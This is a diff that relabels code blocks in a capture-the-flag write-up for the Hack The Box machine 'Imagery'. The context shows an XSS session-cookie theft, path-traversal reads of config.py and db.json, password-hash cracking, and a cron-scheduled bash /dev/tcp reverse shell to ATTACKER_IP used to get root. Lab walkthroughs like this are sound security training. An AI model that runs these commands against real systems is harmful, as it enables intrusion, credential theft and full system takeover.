@@ -18,7 +18,7 @@ Add your machine IP into your /etc/hosts:
 
 Let's use [Rustscan](https://github.com/bee-san/RustScan)/Nmap to check the ports on the Imagery machine.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ rustscan -a imagery.htb -- -A
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -138,7 +138,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds
 
 This is a lot of output from Rustscan as expected, but this is the main part you need to focus on.
 
-```terminal
+```bash
 PORT     STATE SERVICE REASON         VERSION
 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -159,7 +159,7 @@ We have two ports open: SSH (22) and HTTP (8000) running on Python. Let's check 
 
 We can search for possible directories with [Dirsearch](https://github.com/maurosoria/dirsearch).
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ dirsearch -u imagery.htb:8000
 
@@ -289,7 +289,7 @@ If we have a http server running on our attacker machine at some port, the targe
 
 ![XSS](XSS.png)
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ sudo python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -334,7 +334,7 @@ Through looking at environment variables and bruteforcing, I figured out that th
 
 It's probable that most important files is inside `/home/web/web`, and since this is a Python web application, the main python code is inside a file named `app.py`. Since our current directory is in `/home/web/web/*`, we have to look into our parent (or previous) directory. We can use this with curl.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ export admin='Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aYnccw.JCj8PyFIhHbG2cVUFgVoKnq3vdA'
 
@@ -409,7 +409,7 @@ from api_misc import bp_misc
 
 Many imports don't seem like normal Python imports. They are probably other python files in the same directory that contain information themselves. We can first check for `config.py`.
 
-```terminal
+```bash
 ──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ curl -s -H "$admin" 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../config.py'
 import os
@@ -467,7 +467,7 @@ EXIFTOOL_PATH = '/usr/bin/exiftool'
 
 From this, we can see that there is a `db.json` file. db most likely stands for database, meaning it could store valuable information about users on the site.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ curl -s -H "$admin" 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json'
 {
@@ -514,7 +514,7 @@ From this, we can see that there is a `db.json` file. db most likely stands for 
 
 It does contain the username and passwords of the admin and testuser accounts! We can use [John the Ripper](https://www.openwall.com/john/) to crack these hashes.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ echo 'admin:REDACTED' > hashes
 
@@ -761,7 +761,7 @@ There are two useful pieces of information here. All parameters (x, y, width, he
 
 ![Reverse Shell](revshell.png)
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ penelope -p 1337
 [+] Listening for reverse shells on 0.0.0.0:1337 → REDACTED
@@ -781,7 +781,7 @@ We have initial access!
 
 Let's look around a little bit in the home directory.
 
-```terminal
+```bash
 web@Imagery:~/web$ ls
 api_admin.py  api_manage.py  app.py     db.json      static       uploads
 api_auth.py   api_misc.py    bot        env          system_logs  utils.py
@@ -809,14 +809,14 @@ mark  web
 
 We know that there is another user named mark, but we don't know much else. We can try runing Linpeas to find any useful information.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ sudo python3 -m http.server
 [sudo] password for donutmaster: 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
-```terminal
+```bash
 web@Imagery:~/web$ cd /tmp
 web@Imagery:/tmp$ wget http://REDACTED:8000/linpeas.sh
 --2026-02-10 03:02:43--  http://REDACTED:8000/linpeas.sh
@@ -835,7 +835,7 @@ web@Imagery:/tmp$ ./linpeas.sh
 
 After running Linpeas, I found a peculiar directory that it found.
 
-```terminal
+```bash
 drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup
 total 22516
 -rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
@@ -843,12 +843,12 @@ total 22516
 
 There is a /var/backup directory with an aes encrypted zip file. Machines usually have a /var/backups folder, but this machine had another backup directory. We can try to crack the aes file on our attacker machine.
 
-```terminal
+```bash
 web@Imagery:/var/backup$ python3 -m http.server 8001
 Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 ```
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ wget http://10.129.242.164:8001/web_20250806_120723.zip.aes
 --2026-02-10 03:35:22--  http://10.129.242.164:8001/web_20250806_120723.zip.aes
@@ -1022,7 +1022,7 @@ api_auth.py   api_manage.py  api_upload.py  config.py  env      system_logs  uti
 
 After cracking the aes and retreiving the zip file, we can see that this is probably a backup of the site from the past. We can check db.json for any new information.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery/web]
 └─$ cat db.json
 {
@@ -1089,7 +1089,7 @@ We can see that this db.json has the MD5 hash of both the user mark and our curr
 
 We got Mark's password! We can now go back to our shell and become mark!
 
-```terminal
+```bash
 web@Imagery:/var/backup$ su - mark
 Password:
 mark@Imagery:~$
@@ -1106,7 +1106,7 @@ We got the user flag!
 
 We can do a quick `sudo -l` for any possible permissions we have.
 
-```terminal
+```bash
 mark@Imagery:~$ sudo -l
 Matching Defaults entries for mark on Imagery:
     env_reset, mail_badpass,
@@ -1156,7 +1156,7 @@ Please submit the log file and the above error details to error@charcol.com if t
 
 Hmm, none of the passwords we found work for this master passphrase. Luckily, we can reset the password with `charcol -R`.
 
-```terminal
+```bash
 mark@Imagery:~$ sudo /usr/local/bin/charcol -R
 
 Attempting to reset Charcol application password to default.
@@ -1197,7 +1197,7 @@ charcol>
 
 Now, we have a "shell" in Charcol! Let's see what we can do with this.
 
-```terminal
+```bash
 charcol> help
 [2026-02-10 09:20:29] [INFO] 
 Charcol Shell Commands:
@@ -1329,18 +1329,18 @@ Global Flags (apply to all commands unless overridden):
 
 We can list any auto jobs that are currently in place.
 
-```terminal
+```bash
 charcol> auto list
 [2026-02-10 09:21:11] [INFO] No Charcol-managed auto jobs found.
 ```
 
 Although we don't currently have any auto jobs managed by Charcol, we can create one! It's likely that the commands in auto jobs (managed by Charcol) is run by root (or run with root privileges). We can use this command to add an auto job (or schedule) for a reverse shell:
 
-```terminal
+```bash
 auto add --schedule "* * * * *" --command "bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'" --name "root"
 ```
 
-```terminal
+```bash
 charcol> auto add --schedule "* * * * *" --command "bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'" --name "root"
 [2026-02-10 09:24:08] [INFO] System password verification required for this operation.
 Enter system password for user 'mark' to confirm: 
@@ -1352,7 +1352,7 @@ Enter system password for user 'mark' to confirm:
 
 We can now setup a listener on our attacker machine and wait about a minute for the reverse shell.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Imagery]
 └─$ penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 → REDACTED
